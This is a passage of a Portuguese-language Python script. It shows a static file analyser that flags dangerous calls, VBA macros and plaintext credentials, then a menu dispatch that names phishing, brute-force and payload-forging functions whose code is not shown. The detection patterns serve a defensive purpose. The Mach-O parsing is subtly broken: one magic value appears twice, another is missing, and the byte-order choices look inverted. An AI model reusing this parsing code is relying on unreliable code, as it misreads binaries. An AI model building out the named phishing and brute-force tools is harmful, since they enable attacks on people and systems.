            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar ELF: {e}")
    
    # --- Mach-O (macOS Executável) ---
    
    macho_magics = [b'\xfe\xed\xfa\xce', b'\xcf\xfa\xed\xfe', b'\xfe\xed\xfa\xcf', b'\xcf\xfa\xed\xfe']
    if data[:4] in macho_magics:
        file_type = "Executável macOS (Mach-O)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável macOS (Mach-O).")
        # Mach-O header
        try:
            # Determine endianness based on magic
            if data[:4] == b'\xfe\xed\xfa\xce':
                endian = '<'
            elif data[:4] == b'\xcf\xfa\xed\xfe':
                endian = '>'
            elif data[:4] == b'\xfe\xed\xfa\xcf':
                endian = '<'
            elif data[:4] == b'\xcf\xfa\xed\xfe':
                endian = '>'
            else:
                endian = '<' # Default

            cputype = struct.unpack(f'{endian}I', data[4:8])[0]
            cpusubtype = struct.unpack(f'{endian}I', data[8:12])[0]
            filetype = struct.unpack(f'{endian}I', data[12:16])[0]
            
            cpu_names = {7: "x86", 12: "x86_64", 18: "ARM", 19: "ARM64"}
            file_type_names = {1: "OBJECT", 2: "EXECUTE", 3: "DYNAMICLINK", 4: "CORE"}
            
            print(f"[INFO] CPU Type: {cpu_names.get(cputype, hex(cputype))}")
            print(f"[INFO] File Type: {file_type_names.get(filetype, filetype)}")
        except Exception as e:
            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar Mach-O: {e}")

    # --- Python Script ---
    elif file_path.endswith('.py') or b'import ' in data[:1024]:
        file_type = "Script Python"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Script Python.")
        try:
            content = data.decode('utf-8', errors='ignore')
            # Extrai imports
            imports = re.findall(r'^\s*import\s+([\w\.]+)', content, re.MULTILINE)
            from_imports = re.findall(r'^\s*from\s+([\w\.]+)\s+import', content, re.MULTILINE)
            
            all_imports = set(imports + from_imports)
            if all_imports:
                print(f"Imports detectados ({len(all_imports)}):")
                for imp in sorted(all_imports):
                    print(f"  - {imp}")
            
            if 'subprocess' in content:
                print(f"{RED}[ALERTA]{RESET} Uso de 'subprocess' detectado.")
            if 'socket' in content:
                print(f"{YELLOW}[INFO]{RESET} Uso de 'socket' detectado.")
            if 'os.system' in content:
                print(f"{RED}[ALERTA]{RESET} Uso de 'os.system' detectado.")
        except Exception as e:
            print(f"Erro ao ler script: {e}")

    # --- Java JAR/Class ---
    elif data[:4] == b'PK\x03\x04':
        file_type = "Arquivo ZIP (Possível JAR/Office)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como formato ZIP.")
        try:
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                file_list = zip_ref.namelist()
                # Heurística para JAR vs Office
                is_jar = any(f.endswith('.class') for f in file_list)
                is_office = any(f.startswith('word/') or f.startswith('xl/') or f.startswith('ppt/') for f in file_list)
                
                if is_jar:
                    file_type = "Arquivo Java (JAR)"
                    print(f"[INFO] Classificado como JAR ({len(file_list)} classes/arquivos).")
                elif is_office:
                    file_type = "Documento Office (ZIP-based)"
                    print(f"[INFO] Classificado como Documento Office.")
                    # Verifica macros
                    macros = [f for f in file_list if 'vbaProject' in f]
                    if macros:
                        print(f"{RED}[ALERTA]{RESET} Macros VBA detectadas: {macros}")
                else:
                    print(f"[INFO] ZIP genérico ({len(file_list)} arquivos).")
                
                # Lista arquivos se for pequeno ou se usuário pedir 
                if len(file_list) <= 20:
                    print("Conteúdo do ZIP:")
                    for f in file_list:
                        print(f"  - {f}")
                else:
                    print(f"Primeiros 10 arquivos do ZIP:")
                    for f in file_list[:10]:
                        print(f"  - {f}")
                    print(f"  ... e mais {len(file_list) - 10} arquivos.")
                    
                # Verificação de sensibilidade em nomes de arquivos
                sensitive_files = [f for f in file_list if any(kw in f.lower() for kw in ['config', 'manifest', 'security', 'key', 'cert'])]
                if sensitive_files:
                    print(f"{YELLOW}[INFO]{RESET} Arquivos potencialmente sensíveis detectados:")
                    for sf in sensitive_files[:5]:
                        print(f"  - {sf}")

        except zipfile.BadZipFile:
            print(f"{YELLOW}[WARN]{RESET} Arquivo ZIP inválido ou corrompido.")

    # --- Texto Genérico / HTML / JSON ---
    elif file_path.lower().endswith(('.txt', '.md', '.log', '.html', '.htm', '.json', '.xml', '.csv')) or (data[:1] in [b'{', b'[', b'<'] and all(b > 31 or b in (9, 10, 13) for b in data[:100])):
        file_type = "Texto Estruturado (HTML/JSON/XML/TXT)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Texto Estruturado.")
        
        # Detecção de padrões sensíveis em texto
        text_data = data.decode('utf-8', errors='ignore')
        
        # URLs
        urls = re.findall(r'https?://[^\s<>"]+[^.,\)\]\s]', text_data)
        if urls:
            print(f"{BLUE}[INFO]{RESET} URLs encontradas ({len(urls)}):")
            for url in list(set(urls))[:10]:
                print(f"  - {url}")
        
        # E-mails
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text_data)
        if emails:
            print(f"{BLUE}[INFO]{RESET} E-mails encontrados ({len(emails)}):")
            for email in list(set(emails))[:5]:
                print(f"  - {email}")
        
        # IPs
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', text_data)
        if ips:
            # Filtra IPs comuns de loopback ou privados para focar em externos
            interesting_ips = [ip for ip in ips if not ip.startswith(('127.', '10.', '192.168.'))]
            if interesting_ips:
                print(f"{BLUE}[INFO]{RESET} IPs externos encontrados ({len(interesting_ips)}):")
                for ip in list(set(interesting_ips))[:5]:
                    print(f"  - {ip}")
                    
        # Senhas em texto plano (heurística simples)
        password_patterns = re.findall(r'(?i)(password|passwd|pwd|secret|token|api[_-]?key)\s*[:=]\s*["\']?([^\s"\']{4,})', text_data)
        if password_patterns:
            print(f"{RED}[ALERTA]{RESET} Possíveis credenciais em texto plano detectadas:")
            for key, val in password_patterns[:5]:
                print(f"  - {key}: {val[:20]}{'...' if len(val) > 20 else ''}")

    else:
        print(f"{YELLOW}[INFO]{RESET} Tipo de arquivo não específico. Análise baseada apenas em entropia e strings.")

    # 6. RESUMO EXECUTIVO
    print("\n" + "="*20)
    print(" 📊 RESUMO EXECUTIVO")
    print("="*20)
    print(f"Arquivo: {os.path.basename(file_path)}")
    print(f"Tipo: {file_type}")
    print(f"SHA-256: {hashes['sha256']}")
    print(f"Entropia: {entropy:.4f}")
    
    if found_packer:
        print(f"Packer: {found_packer}")
        
    if interesting_strings:
        print(f"Strings Críticas: {len(interesting_strings)}")
        
    print(f"\n{GREEN}[CONCLUÍDO]{RESET} Análise finalizada.")
    print("="*50)
               

if option == 1:
    analise()
elif option == 2:
    gerador_de_senhas()
elif option == 3:
    telefone()
elif option == 4:
    geolocalizar_ip()
elif option == 5:
    phisher()
elif option == 6:
    malware_total()
elif option == 7:
    internet()
elif option == 8:
    manual()
elif option == 9:
    brute_force()
elif option == 10:
    payload_forge()
elif option == 11:
    reverse_engineer()
else:
    print("Opção invalida porfavor digite outro numero")
